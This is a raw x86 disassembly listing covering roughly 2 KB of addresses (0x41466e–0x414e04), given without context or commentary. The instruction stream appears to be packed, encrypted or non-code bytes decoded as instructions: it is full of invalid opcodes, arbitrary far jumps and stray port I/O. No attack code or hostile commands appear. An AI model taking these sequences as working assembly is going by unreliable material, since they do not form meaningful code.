  41466e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41466f:	retf   
  414670:	push   0xb2bf4f6f
  414675:	(bad)  
  414676:	fbstp  TBYTE PTR [ecx]
  414678:	pushf  
  414679:	mov    ds:0x952e286f,al
  41467e:	sub    bh,BYTE PTR [ebp-0x5a]
  414681:	enter  0xa312,0x8e
  414685:	fild   QWORD PTR [esi-0x18]
  414688:	cmp    edi,DWORD PTR [ebx-0x67]
  41468b:	add    edi,DWORD PTR [edx+eax*4]
  41468e:	stos   DWORD PTR es:[edi],eax
  41468f:	scas   al,BYTE PTR es:[edi]
  414690:	and    al,cl
  414692:	std    
  414693:	cmp    al,0x18
  414695:	ja     0x414701
  414697:	mov    ebx,0xfed7519e
  41469c:	retf   0x4377
  41469f:	popa   
  4146a0:	addr16 mov eax,ss:0x9215
  4146a5:	sub    al,0x27
  4146a7:	lods   eax,DWORD PTR ds:[esi]
  4146a8:	dec    BYTE PTR [esi]
  4146aa:	and    ah,dh
  4146ac:	ret    0xf5ab
  4146af:	scas   eax,DWORD PTR es:[edi]
  4146b0:	fwait
  4146b1:	and    esi,DWORD PTR ds:0xc62e958e
  4146b7:	loope  0x41468a
  4146b9:	imul   ebp,DWORD PTR [eax+0x3badfc6c],0x3b5f8db8
  4146c3:	dec    ebx
  4146c4:	aam    0xb
  4146c6:	ret    
  4146c7:	inc    ecx
  4146c8:	and    eax,0x37414990
  4146cd:	out    dx,eax
  4146ce:	loop   0x4146c0
  4146d0:	fs aam 0x1b
  4146d3:	inc    eax
  4146d4:	inc    eax
  4146d5:	mov    bl,0xa5
  4146d7:	repz jb 0x41473b
  4146da:	test   DWORD PTR [esi+0x4b51af24],edx
  4146e0:	clc    
  4146e1:	loopne 0x414762
  4146e3:	adc    BYTE PTR [ecx-0x5d],dl
  4146e6:	retf   0xa20e
  4146e9:	imul   DWORD PTR [esi-0x48]
  4146ec:	inc    BYTE PTR gs:[ebp+0xc28787c]
  4146f3:	add    ah,0x14
  4146f6:	push   esp
  4146f7:	fidivr WORD PTR [ebp-0x88a7597]
  4146fd:	aaa    
  4146fe:	add    eax,0x6dd5b280
  414703:	es jbe 0x414705
  414706:	mov    eax,0x79528076
  41470b:	xor    edi,DWORD PTR ds:0xfd96d88
  414711:	stos   BYTE PTR es:[edi],al
  414712:	mov    ch,0x93
  414714:	(bad)  
  414717:	cmp    BYTE PTR [esi-0x5e],0xa7
  41471b:	div    BYTE PTR [edi-0x7eec1677]
  414721:	sub    esp,DWORD PTR [ecx-0x2f]
  414724:	mov    eax,0x57cb6f01
  414729:	mov    edi,0x56ea4024
  41472e:	jmp    0x4c569555
  414733:	adc    BYTE PTR [ecx-0x5],bl
  414736:	and    dl,ch
  414738:	add    al,0xf9
  41473a:	test   DWORD PTR [ebp+eiz*2-0x45d8dc27],esp
  414741:	dec    esi
  414742:	loop   0x414784
  414744:	das    
  414745:	(bad)  
  414746:	pop    esp
  414747:	jl     0x4146e4
  414749:	push   es
  41474a:	adc    BYTE PTR [edx-0x65],0xbe
  41474e:	jns    0x4146ff
  414750:	das    
  414751:	clc    
  414752:	add    eax,0xc0e472fd
  414757:	sub    bh,al
  414759:	add    al,0x41
  41475b:	lods   eax,DWORD PTR ds:[esi]
  41475c:	jmp    0x414784
  41475e:	and    edi,DWORD PTR [edi-0x5b7bb7fd]
  414764:	shr    esi,cl
  414766:	mov    dl,BYTE PTR [edx]
  414768:	sti    
  414769:	pop    es
  41476a:	mov    al,0x38
  41476c:	mov    bl,0xf0
  41476e:	mov    ecx,0xb85874d3
  414773:	lea    ebx,cs:[eax-0x32]
  414777:	cld    
  414778:	pop    esp
  414779:	lods   eax,DWORD PTR ds:[esi]
  41477a:	hlt    
  41477b:	dec    esp
  41477c:	pop    edx
  41477d:	dec    esp
  41477e:	ficomp WORD PTR [ecx-0x3f]
  414781:	jmp    0x9605:0x89b4997a
  414788:	mov    dh,0x2
  41478a:	in     eax,dx
  41478b:	call   0xa7798299
  414790:	jnp    0x4147a1
  414792:	sbb    dl,al
  414794:	lds    ebx,FWORD PTR [ebp+0x18]
  414797:	rol    BYTE PTR [edi],cl
  414799:	jb     0x4147e7
  41479b:	push   edx
  41479c:	push   0x76ed048e
  4147a1:	adc    bh,BYTE PTR [eiz*4-0x2d0edb52]
  4147a8:	inc    BYTE PTR [edi-0x638990f5]
  4147ae:	mov    dh,BYTE PTR [esi+edi*8-0x7cc8240]
  4147b5:	mov    WORD PTR [ecx],?
  4147b7:	push   esi
  4147b8:	sbb    BYTE PTR [edx+0x156fe6c5],bh
  4147be:	inc    ebp
  4147bf:	pop    edx
  4147c0:	in     al,dx
  4147c1:	jmp    0xf77f:0xd382d0a6
  4147c8:	xor    al,0xa7
  4147ca:	(bad)  
  4147cb:	dec    eax
  4147cc:	scas   eax,DWORD PTR es:[edi]
  4147cd:	outs   dx,DWORD PTR ds:[esi]
  4147ce:	mov    esi,0x217a3a26
  4147d3:	fcomp  DWORD PTR [edx]
  4147d5:	fs shrd esi,ebp,cl
  4147d9:	inc    edx
  4147da:	jne    0x41477f
  4147dc:	imul   edx,DWORD PTR [eax],0xeaebd840
  4147e2:	in     al,0xbc
  4147e4:	sti    
  4147e5:	clc    
  4147e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147e7:	cmp    al,0xa5
  4147e9:	test   al,0xbd
  4147eb:	(bad)  
  4147ec:	clc    
  4147ed:	inc    esp
  4147ee:	pushf  
  4147ef:	or     BYTE PTR [ecx+0x4379e716],dl
  4147f5:	loopne 0x414817
  4147f7:	in     eax,0x23
  4147f9:	dec    edi
  4147fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147fb:	adc    BYTE PTR [edx+0x23],bh
  4147fe:	mov    edi,0x29c969cb
  414803:	mov    bl,0x55
  414805:	out    0xe2,eax
  414807:	add    ebx,edx
  414809:	add    ebp,eax
  41480b:	mov    esi,0xc2fa37e3
  414810:	cmp    DWORD PTR [ebx+eiz*8],esp
  414813:	adc    BYTE PTR [esp+ebp*2-0x528e9608],bl
  41481a:	xchg   esi,eax
  41481b:	popf   
  41481c:	pop    ds
  41481d:	pop    ebp
  41481e:	pop    esp
  41481f:	xchg   BYTE PTR [ebp-0x46afc9c7],cl
  414825:	idiv   BYTE PTR [ebp-0x79e20cec]
  41482b:	cli    
  41482c:	aaa    
  41482d:	dec    ebx
  41482e:	fwait
  41482f:	inc    esi
  414830:	jecxz  0x4147f3
  414832:	and    ah,BYTE PTR [eax-0x264a19f9]
  414838:	(bad)  
  41483a:	in     al,dx
  41483b:	xchg   esi,eax
  41483c:	add    ebx,edi
  41483e:	xchg   edx,eax
  41483f:	dec    edx
  414840:	push   es
  414841:	xchg   DWORD PTR [ebx],edi
  414843:	bound  eax,QWORD PTR [edi-0x2416522a]
  414849:	xchg   ebp,eax
  41484a:	in     al,0x60
  41484c:	out    0xc0,al
  41484e:	out    dx,eax
  41484f:	push   eax
  414850:	dec    ebx
  414851:	or     al,0x16
  414853:	and    ecx,0xfffffffa
  414856:	xchg   ebp,eax
  414857:	mov    BYTE PTR [edi-0x6720aecf],ch
  41485d:	push   ebx
  41485e:	jg     0x41482b
  414860:	ror    DWORD PTR [ebx],1
  414862:	sar    DWORD PTR [eax-0x6ed1e08],1
  414868:	add    eax,0x2d352a50
  41486d:	xchg   edi,eax
  41486e:	jmp    0x414881
  414870:	gs inc esp
  414872:	ret    0xb3df
  414875:	push   ebp
  414876:	jae    0x41486a
  414878:	retf   
  414879:	push   ecx
  41487a:	fcmovnbe st,st(7)
  41487c:	dec    ah
  41487e:	mov    eax,ds:0x69a68601
  414883:	jno    0x414819
  414885:	loop   0x414849
  414887:	xchg   ecx,eax
  414888:	cs ret 0xd701
  41488c:	pop    es
  41488d:	add    BYTE PTR [ebx],ch
  41488f:	popa   
  414890:	mov    ecx,0x9da13acd
  414895:	in     eax,0x31
  414897:	pop    ecx
  414898:	call   0x30f6:0x538da364
  41489f:	push   es
  4148a0:	xchg   esi,eax
  4148a1:	in     al,dx
  4148a2:	pop    ebp
  4148a3:	rcr    BYTE PTR [edx],1
  4148a5:	fst    QWORD PTR [ebp-0x78]
  4148a8:	push   esp
  4148a9:	jns    0x414838
  4148ab:	xchg   edx,eax
  4148ac:	pusha  
  4148ad:	je     0x4148f8
  4148af:	inc    edi
  4148b0:	fdivrp st(3),st
  4148b2:	sbb    esp,0x6ca223ec
  4148b8:	popf   
  4148b9:	sbb    ch,al
  4148bb:	cdq    
  4148bc:	jg     0x4148c7
  4148be:	and    al,0x15
  4148c0:	push   0x2c671c57
  4148c5:	aas    
  4148c6:	dec    ebp
  4148c7:	xlat   BYTE PTR ds:[ebx]
  4148c8:	stc    
  4148c9:	lock sub eax,0x8da73e80
  4148cf:	or     DWORD PTR [ebx],ecx
  4148d1:	add    al,0xf2
  4148d3:	(bad)  
  4148d5:	and    eax,0x554dba35
  4148da:	ror    DWORD PTR [edi+0x3676e05d],cl
  4148e0:	inc    ecx
  4148e1:	rcl    DWORD PTR [eax+edx*4],1
  4148e4:	xchg   edi,eax
  4148e5:	mov    ebx,0xd801096
  4148ea:	jns    0x41491a
  4148ec:	or     ecx,ebp
  4148ee:	lahf   
  4148ef:	jle    0x41489e
  4148f1:	and    BYTE PTR [ebp+0x59],al
  4148f4:	pushf  
  4148f5:	fwait
  4148f6:	pop    bp
  4148f8:	adc    edi,DWORD PTR [edx+edi*1+0x1e]
  4148fc:	xor    bl,BYTE PTR [ebx]
  4148fe:	mov    edx,0xe0ae4068
  414903:	je     0x414966
  414905:	add    al,BYTE PTR ss:[ebx]
  414908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414909:	ss stc 
  41490b:	mov    BYTE PTR [ebx+0x509ef898],bh
  414911:	nop
  414912:	stos   DWORD PTR es:[edi],eax
  414913:	sub    al,0x1e
  414915:	inc    eax
  414916:	push   0xffffffc1
  414918:	fidiv  WORD PTR [edi+eax*1+0x41]
  41491c:	sbb    al,0x9
  41491e:	jg     0x414914
  414920:	stos   BYTE PTR es:[edi],al
  414921:	mov    ebp,0x5cbd6121
  414926:	mov    bh,0x8c
  414928:	xchg   ebx,eax
  414929:	sbb    ah,cl
  41492b:	jmp    0x43e0:0x286284d8
  414932:	scas   eax,DWORD PTR es:[edi]
  414933:	int    0x21
  414935:	sub    BYTE PTR [esi+ebx*2+0x47],0x2e
  41493a:	sub    BYTE PTR [edi],al
  41493c:	adc    al,0x8
  41493e:	(bad)  
  41493f:	call   0xcdb44dd4
  414944:	je     0x4149b1
  414946:	pop    ds
  414947:	fstp   DWORD PTR [ecx-0xdab2263]
  41494d:	cld    
  41494e:	fsub   DWORD PTR [ebp+0x32]
  414951:	fsubr  QWORD PTR [eax-0x692d4266]
  414957:	add    ecx,DWORD PTR [esi]
  414959:	bound  esp,QWORD PTR [ecx]
  41495b:	add    DWORD PTR [ebx],edi
  41495d:	aam    0xe1
  41495f:	lahf   
  414960:	xor    DWORD PTR [esi],0x93bd5763
  414966:	xchg   BYTE PTR [ebx-0x71bec573],al
  41496c:	ins    DWORD PTR es:[edi],dx
  41496d:	push   ds
  41496e:	sub    esp,edi
  414970:	lea    eax,[edx-0x7f]
  414973:	div    BYTE PTR [ecx]
  414975:	and    al,0xd4
  414977:	inc    edi
  414978:	xor    DWORD PTR [eax],esp
  41497a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41497b:	js     0x414976
  41497d:	rcr    DWORD PTR [ebp+esi*2-0x26d97de2],1
  414984:	je     0x414952
  414986:	cmp    esi,DWORD PTR cs:[edi+0x4a6ffc44]
  41498d:	inc    esi
  41498e:	pop    ebp
  41498f:	push   esi
  414990:	cmc    
  414991:	dec    ecx
  414992:	sbb    cl,0x6
  414995:	es jg  0x414927
  414998:	int3   
  414999:	fisub  DWORD PTR [ebp-0x3b]
  41499c:	push   ecx
  41499d:	icebp  
  41499e:	jle    0x414a1d
  4149a0:	and    al,0x55
  4149a2:	xchg   esi,eax
  4149a3:	mov    bl,bl
  4149a5:	out    0xcb,al
  4149a7:	jmp    0xb60d57a0
  4149ac:	bnd jns 0x414a28
  4149af:	push   0x1d
  4149b1:	lahf   
  4149b2:	sbb    BYTE PTR [eax+ecx*1-0x2d0ad495],bh
  4149b9:	in     al,dx
  4149ba:	iret   
  4149bb:	jne    0x414996
  4149bd:	mov    ebp,0x2522a29a
  4149c2:	out    0x34,al
  4149c4:	lahf   
  4149c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149c6:	jle    0x414a34
  4149c8:	xor    al,BYTE PTR [ebx+0x24]
  4149cb:	ds dec esp
  4149cd:	lods   al,BYTE PTR ds:[esi]
  4149ce:	fbld   TBYTE PTR [eax-0x4c]
  4149d1:	pop    ebp
  4149d2:	mov    al,ds:0xd53da558
  4149d7:	push   ebx
  4149d8:	dec    eax
  4149d9:	int    0xe8
  4149db:	aaa    
  4149dc:	pop    esi
  4149dd:	cli    
  4149de:	adc    DWORD PTR [esi-0x53bb326],ebx
  4149e4:	loop   0x414991
  4149e6:	dec    eax
  4149e7:	mov    dh,0xfc
  4149e9:	adc    BYTE PTR [edi],0x52
  4149ec:	vpand  xmm1,xmm1,XMMWORD PTR [edx-0x179a427c]
  4149f4:	push   ebx
  4149f5:	mov    bl,BYTE PTR [ecx+0x63]
  4149f8:	sbb    esp,esp
  4149fa:	and    eax,DWORD PTR [edi+0x7f]
  4149fd:	ja     0x4149a0
  4149ff:	mov    al,0xe4
  414a01:	mov    dl,0x1e
  414a03:	loopne 0x414a72
  414a05:	push   DWORD PTR [ebx]
  414a07:	sar    DWORD PTR [edi+ecx*4],cl
  414a0a:	or     eax,0x91736ae7
  414a0f:	dec    ecx
  414a10:	and    eax,0x1b1ff621
  414a15:	je     0x4149f1
  414a17:	mov    dl,BYTE PTR [ebx-0x2d]
  414a1a:	lods   al,BYTE PTR ds:[esi]
  414a1b:	adc    ah,BYTE PTR [edi+0x25]
  414a1e:	cmp    BYTE PTR [ebp+0x57],dl
  414a21:	push   cs
  414a22:	mov    bl,0x32
  414a24:	out    0x61,al
  414a26:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a29:	fsubr  DWORD PTR [ebp+0x2cca25af]
  414a2f:	dec    edx
  414a30:	in     al,dx
  414a31:	push   0x3abc7f48
  414a36:	retf   0x3e93
  414a39:	sub    ah,BYTE PTR [edx-0x13bf46ab]
  414a3f:	fist   WORD PTR [edx-0x25]
  414a42:	fldenv [ebx]
  414a44:	push   edx
  414a45:	xchg   ebx,eax
  414a46:	or     eax,0x5c6a6d85
  414a4b:	(bad)  
  414a4c:	std    
  414a4d:	pop    edi
  414a4e:	xor    ebp,ebp
  414a50:	popf   
  414a51:	test   al,0xb9
  414a53:	call   0x72be:0x85e75b20
  414a5a:	in     eax,0x17
  414a5c:	mov    eax,0x1b278d09
  414a61:	cmp    bl,BYTE PTR [edx+0x589672ac]
  414a67:	jae    0x414ac6
  414a69:	jmp    0xc545bba
  414a6e:	jbe    0x414a00
  414a70:	icebp  
  414a71:	xor    al,0x42
  414a73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a74:	dec    edx
  414a75:	ss cmp eax,0xff7425eb
  414a7b:	dec    ebx
  414a7c:	rcr    DWORD PTR [ebx+0x75],0x9f
  414a80:	ins    DWORD PTR es:[edi],dx
  414a81:	xor    edi,DWORD PTR [ebp+0x4b]
  414a84:	xor    al,0xc7
  414a86:	add    al,0x89
  414a88:	adc    al,0x89
  414a8a:	jmp    0x5a2c:0x3bfdde04
  414a91:	xor    cl,BYTE PTR [eax+0x2d]
  414a94:	mov    eax,0xcd17c833
  414a99:	ss xchg ebp,eax
  414a9b:	jbe    0x414ae5
  414a9d:	stos   BYTE PTR es:[edi],al
  414a9e:	(bad)  
  414a9f:	mov    ds:0xf567024a,al
  414aa4:	inc    edx
  414aa5:	(bad)  
  414aa6:	pusha  
  414aa7:	scas   al,BYTE PTR es:[edi]
  414aa8:	imul   ebp,DWORD PTR [ebp+0x38],0x12
  414aac:	cli    
  414aad:	mov    eax,ds:0xc0c37450
  414ab2:	add    DWORD PTR [eax+0xf],esp
  414ab5:	add    BYTE PTR [edx+0x9cd42e7],bh
  414abb:	and    al,0xa1
  414abd:	jbe    0x414b24
  414abf:	lock inc eax
  414ac1:	ins    DWORD PTR es:[edi],dx
  414ac2:	imul   edi,DWORD PTR [edi-0x60],0xffffffc9
  414ac6:	out    0x9d,al
  414ac8:	fldcw  WORD PTR es:[eax+0xd]
  414acc:	mov    BYTE PTR [ebx+0x6bcd0401],bh
  414ad2:	mov    ?,WORD PTR [edi-0x3a]
  414ad5:	pop    ecx
  414ad6:	ins    DWORD PTR es:[edi],dx
  414ad7:	cmc    
  414ad8:	dec    edi
  414ad9:	rcr    BYTE PTR [edx+0x329ae5be],cl
  414adf:	or     DWORD PTR [edi],esi
  414ae1:	mov    ds:0x7e5f2fcb,eax
  414ae6:	cmp    al,0x55
  414ae8:	dec    BYTE PTR [ebx]
  414aea:	in     al,0x7a
  414aec:	jno    0x414adf
  414aee:	push   0xffffff9a
  414af0:	jno    0x414ae4
  414af2:	pusha  
  414af3:	scas   al,BYTE PTR es:[edi]
  414af4:	cli    
  414af5:	inc    ebp
  414af6:	scas   al,BYTE PTR es:[edi]
  414af7:	ins    DWORD PTR es:[edi],dx
  414af8:	cmp    cl,BYTE PTR [eax]
  414afa:	sub    BYTE PTR [ecx],dh
  414afc:	jecxz  0x414add
  414afe:	int3   
  414aff:	adc    DWORD PTR [eax],esi
  414b01:	push   0xf7fd713d
  414b06:	leave  
  414b07:	inc    esi
  414b08:	repz xchg ebp,eax
  414b0a:	add    edi,0xa
  414b0d:	pop    es
  414b0e:	mov    ah,0x1
  414b10:	mov    ebx,0xb92b343f
  414b15:	ror    bl,1
  414b17:	leave  
  414b18:	pop    esi
  414b19:	retf   
  414b1a:	ss sbb ebx,ebx
  414b1d:	jmp    0x6417cc97
  414b22:	pop    edi
  414b23:	cdq    
  414b24:	adc    al,0x8a
  414b26:	call   FWORD PTR [eax-0x2f454b89]
  414b2c:	je     0x414aeb
  414b2e:	xor    al,0xeb
  414b30:	pushf  
  414b31:	mov    ds:0x8b9fdefc,al
  414b36:	sub    ecx,0x42
  414b39:	jns    0x414b92
  414b3b:	rcl    DWORD PTR [ecx-0x7b],0x5
  414b3f:	stos   BYTE PTR es:[edi],al
  414b40:	jmp    0x5f42:0x29ece629
  414b47:	cwde   
  414b48:	xchg   edx,eax
  414b49:	sbb    DWORD PTR [eax],ebx
  414b4b:	clc    
  414b4c:	add    DWORD PTR [edi+0xc],ebp
  414b4f:	inc    ebx
  414b50:	adc    ebp,ebp
  414b52:	jo     0x414b08
  414b54:	xor    bh,BYTE PTR [ebx]
  414b56:	jne    0x414bbf
  414b58:	ins    BYTE PTR es:[edi],dx
  414b59:	cmp    BYTE PTR [edi+eiz*8-0x1e],al
  414b5d:	mov    ecx,0x4c16bdce
  414b62:	xchg   DWORD PTR [ebp+0x7d],eax
  414b65:	into   
  414b66:	xchg   dh,cl
  414b68:	xor    cl,bh
  414b6a:	repz jnp 0x414b2a
  414b6d:	jb     0x414baa
  414b6f:	cmp    al,0x5d
  414b71:	jbe    0x414b5e
  414b73:	mov    BYTE PTR [eax],dl
  414b75:	pop    esi
  414b76:	sti    
  414b77:	(bad)  
  414b78:	push   edx
  414b79:	not    DWORD PTR [edi]
  414b7b:	mov    ds:0xe2a194b2,al
  414b80:	(bad)  
  414b81:	sub    al,0xc6
  414b83:	mov    eax,ds:0xc6702e68
  414b88:	aad    0x51
  414b8a:	dec    esp
  414b8b:	sub    ebx,DWORD PTR [ebx+0x2]
  414b8e:	lock sbb DWORD PTR [esi-0x3a],ebp
  414b92:	test   edx,esp
  414b94:	cmp    bl,BYTE PTR [ecx]
  414b96:	ins    DWORD PTR es:[edi],dx
  414b97:	cli    
  414b98:	cmp    esp,esp
  414b9a:	mov    ebp,DWORD PTR [esp+edx*1]
  414b9d:	outs   dx,BYTE PTR ds:[esi]
  414b9e:	fwait
  414b9f:	dec    eax
  414ba0:	cs mov edi,0x2ff8211f
  414ba6:	mov    ebp,0x22677407
  414bab:	inc    eax
  414bac:	loope  0x414b6a
  414bae:	popf   
  414baf:	jo     0x414b33
  414bb1:	or     al,0xd4
  414bb3:	cli    
  414bb4:	jg     0x414bcc
  414bb6:	outs   dx,DWORD PTR ds:[esi]
  414bb7:	mov    ch,0x50
  414bb9:	and    edi,edx
  414bbb:	dec    esp
  414bbc:	mov    DWORD PTR [ebx+0x27],ebx
  414bbf:	sub    al,0x9
  414bc1:	xor    al,0xff
  414bc3:	push   ds
  414bc4:	push   ds
  414bc5:	and    BYTE PTR [edx+0x7312c2dd],0x8f
  414bcc:	inc    ecx
  414bcd:	cmp    BYTE PTR ds:0x4c081c4f,ch
  414bd3:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bd5:	scas   al,BYTE PTR es:[edi]
  414bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bd7:	sub    DWORD PTR [esi],esi
  414bd9:	pop    ebp
  414bda:	xlat   BYTE PTR ds:[ebx]
  414bdb:	fcom   DWORD PTR [esi-0x3e]
  414bde:	scas   al,BYTE PTR es:[edi]
  414bdf:	loopne 0x414c3c
  414be1:	not    BYTE PTR [edx+0x66]
  414be4:	push   ecx
  414be5:	scas   al,BYTE PTR es:[edi]
  414be6:	cmc    
  414be7:	push   ds
  414be8:	mov    eax,0xe58abc8b
  414bed:	sbb    dh,BYTE PTR [esi+0x59]
  414bf0:	mov    bh,0x98
  414bf2:	xor    al,0x83
  414bf4:	push   es
  414bf5:	jnp    0x414be1
  414bf7:	pop    eax
  414bf8:	mov    BYTE PTR [ebx-0x79363de2],bl
  414bfe:	jmp    0x7ea63586
  414c03:	jb     0x414bd4
  414c05:	mov    edx,0x1dd540d9
  414c0a:	fucomip st,st(0)
  414c0c:	push   edx
  414c0d:	xchg   esi,eax
  414c0e:	cmc    
  414c0f:	xchg   ebp,eax
  414c10:	inc    eax
  414c11:	imul   ecx,esi,0xffffffa1
  414c14:	mov    ebp,0xaf05ea64
  414c19:	or     eax,0x9fe4b64f
  414c1e:	call   0x30c1:0xb959a0d6
  414c25:	ins    BYTE PTR es:[edi],dx
  414c26:	cmc    
  414c27:	leave  
  414c28:	add    edx,eax
  414c2a:	sub    ch,dh
  414c2c:	lods   eax,DWORD PTR ds:[esi]
  414c2d:	shl    DWORD PTR [esi],1
  414c2f:	mov    eax,ds:0x611ba908
  414c34:	retf   
  414c35:	int3   
  414c36:	adc    BYTE PTR [ecx],dl
  414c38:	sti    
  414c39:	add    eax,0xd278ad01
  414c3e:	clc    
  414c3f:	pop    edx
  414c40:	bound  ecx,QWORD PTR [ebp+ebx*8-0x2c]
  414c44:	fbld   TBYTE PTR [edi]
  414c46:	retf   
  414c47:	lods   al,BYTE PTR ds:[esi]
  414c48:	stc    
  414c49:	cmp    DWORD PTR [esi],esp
  414c4b:	adc    esi,DWORD PTR [edi+0x38ecac62]
  414c51:	sub    al,0x17
  414c53:	inc    eax
  414c54:	or     ecx,DWORD PTR [eax]
  414c56:	lods   al,BYTE PTR ds:[esi]
  414c57:	ret    
  414c58:	xor    BYTE PTR ds:0xcd9cf839,cl
  414c5e:	mov    edx,0x10c982fb
  414c63:	loopne 0x414c7b
  414c65:	popf   
  414c66:	xchg   BYTE PTR [ebp-0x36494844],ch
  414c6c:	bswap  ecx
  414c6e:	mov    ch,0x1d
  414c70:	sbb    BYTE PTR ds:0xa5d536d9,dl
  414c76:	dec    ecx
  414c77:	add    eax,0x4ca2360a
  414c7c:	(bad)  
  414c7d:	jmp    0x1000:0x8de4394
  414c84:	mov    cs,ebp
  414c86:	and    ebx,DWORD PTR [ecx+0x5b8da393]
  414c8c:	push   edx
  414c8d:	mov    es,ecx
  414c8f:	cmp    BYTE PTR [ecx+0x1a627adc],ch
  414c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c96:	fadd   QWORD PTR [ecx]
  414c98:	and    ecx,esi
  414c9a:	stc    
  414c9b:	sbb    al,0x7b
  414c9d:	outs   dx,BYTE PTR ds:[esi]
  414c9e:	ins    BYTE PTR es:[edi],dx
  414c9f:	sub    eax,0x3f5c91b
  414ca4:	xor    eax,0x20688011
  414ca9:	ins    DWORD PTR es:[edi],dx
  414caa:	mov    eax,ds:0x673500a2
  414caf:	(bad)  
  414cb0:	rcl    bh,1
  414cb2:	jnp    0x414d0f
  414cb4:	mov    ah,0xfb
  414cb6:	pusha  
  414cb7:	outs   dx,DWORD PTR ds:[esi]
  414cb8:	shr    DWORD PTR [edi],0xd5
  414cbb:	adc    esi,edi
  414cbd:	push   ds
  414cbe:	sub    DWORD PTR [edx+ebp*4-0x48],ebx
  414cc2:	out    dx,eax
  414cc3:	scas   al,BYTE PTR es:[edi]
  414cc4:	fadd   DWORD PTR [edx-0x3b]
  414cc7:	dec    ebx
  414cc8:	lea    esp,[ebx+edi*2+0x474e0252]
  414ccf:	iret   
  414cd0:	mov    DWORD PTR [ecx],edx
  414cd2:	rcr    ecx,1
  414cd4:	inc    ebx
  414cd5:	test   al,0xfa
  414cd7:	outs   dx,BYTE PTR ds:[esi]
  414cd8:	and    DWORD PTR [edx+0xbf6cb8e],edx
  414cde:	sbb    al,0x70
  414ce0:	push   edi
  414ce1:	xor    esp,DWORD PTR [esi]
  414ce3:	mov    edi,0xb2f28e5d
  414ce8:	in     al,dx
  414ce9:	into   
  414cea:	lock dec edi
  414cec:	or     edx,ebx
  414cee:	dec    eax
  414cef:	cdq    
  414cf0:	mov    ah,0xc3
  414cf2:	dec    ebx
  414cf3:	xor    al,0x5b
  414cf5:	and    bl,BYTE PTR [eax+ebp*2]
  414cf8:	sbb    DWORD PTR [esi+0x225e4487],esp
  414cfe:	mov    al,ds:0xd9d47248
  414d03:	(bad)  
  414d04:	retf   
  414d05:	and    al,0x8a
  414d07:	push   ebp
  414d08:	popa   
  414d09:	pushf  
  414d0a:	bound  ecx,QWORD PTR [ebx-0x12794b0c]
  414d10:	into   
  414d11:	inc    ebx
  414d12:	push   eax
  414d13:	cmc    
  414d14:	push   edx
  414d15:	ret    0xe43f
  414d18:	mov    eax,0x6e26c743
  414d1d:	je     0x414d92
  414d1f:	aas    
  414d20:	push   esi
  414d21:	and    esp,DWORD PTR [ecx+0x8]
  414d24:	lock aaa 
  414d26:	lea    edx,[eax]
  414d28:	aas    
  414d29:	shl    bl,1
  414d2b:	(bad)  
  414d2c:	sbb    al,0xd4
  414d2e:	sti    
  414d2f:	cmp    al,0xfb
  414d31:	push   es
  414d32:	adc    eax,0xad3652ed
  414d37:	scas   eax,DWORD PTR es:[edi]
  414d38:	jns    0x414d65
  414d3a:	adc    eax,0xa2989539
  414d3f:	outs   dx,DWORD PTR ds:[esi]
  414d40:	mov    edi,0xa133f732
  414d45:	xchg   esi,eax
  414d46:	cli    
  414d47:	jae    0x414dac
  414d49:	sbb    eax,0xfe22c859
  414d4e:	add    esp,DWORD PTR [ebx*8-0x249d5f54]
  414d55:	or     al,0xb2
  414d57:	and    ebx,0xffffffce
  414d5a:	neg    DWORD PTR [ebp+eiz*1+0x1d]
  414d5e:	div    DWORD PTR [ebp-0x3c49e97a]
  414d64:	cmp    dh,BYTE PTR [ebp+edi*1+0x27bc6a90]
  414d6b:	add    al,0x74
  414d6d:	push   ebp
  414d6e:	pop    es
  414d6f:	jb     0x414d92
  414d71:	xchg   DWORD PTR [ebx-0x1c5df4ec],edx
  414d77:	mov    ecx,0x2808c153
  414d7c:	mov    ds:0x8f417ecb,eax
  414d81:	popf   
  414d82:	sbb    ecx,ebp
  414d84:	repz push edx
  414d86:	stos   DWORD PTR es:[edi],eax
  414d87:	repnz das 
  414d89:	pop    edx
  414d8a:	fstp   DWORD PTR [esi-0x38d3ebdc]
  414d90:	jns    0x414d78
  414d92:	js     0x414d50
  414d94:	mov    cl,0x2a
  414d96:	dec    edi
  414d97:	outs   dx,BYTE PTR ds:[esi]
  414d98:	dec    edx
  414d99:	xchg   edx,eax
  414d9a:	(bad)  
  414d9b:	repz popa 
  414d9d:	mov    ds:0x5d42985b,al
  414da2:	lods   eax,DWORD PTR ds:[esi]
  414da3:	out    dx,eax
  414da4:	push   0x9007d58
  414da9:	mov    esi,0xbf214b82
  414dae:	arpl   WORD PTR [esi+esi*4+0x36],ax
  414db2:	mov    ebp,0x55903a19
  414db7:	add    ecx,DWORD PTR [esi]
  414db9:	ss lock std 
  414dbc:	xchg   ecx,eax
  414dbd:	or     al,0x44
  414dbf:	xor    al,0xe1
  414dc1:	or     DWORD PTR [esi+0x645783eb],edx
  414dc7:	sbb    BYTE PTR [ebp-0x23],dl
  414dca:	adc    al,0x3
  414dcc:	and    eax,0x6a91ce2a
  414dd1:	repz inc esi
  414dd3:	pop    ss
  414dd4:	adc    al,0x7a
  414dd6:	(bad)  
  414dd7:	mov    edi,0x7a8bf767
  414ddc:	adc    al,0x13
  414dde:	sbb    ebx,edi
  414de0:	fwait
  414de1:	add    cl,BYTE PTR [ecx-0x54]
  414de4:	retf   0x7467
  414de7:	mov    ebp,DWORD PTR [esi+0x63]
  414dea:	cmc    
  414deb:	fsubr  st(3),st
  414ded:	in     al,dx
  414dee:	dec    edx
  414def:	cmp    al,BYTE PTR [ecx+0x52f6dca9]
  414df5:	les    edx,FWORD PTR ds:0xc1d2ab0e
  414dfb:	retf   0x1516
  414dfe:	dec    ebx
  414dff:	xchg   esp,eax
  414e00:	mov    dl,0x88
  414e02:	add    DWORD PTR [edi],edi
  414e04:	jmp    0xb5776554
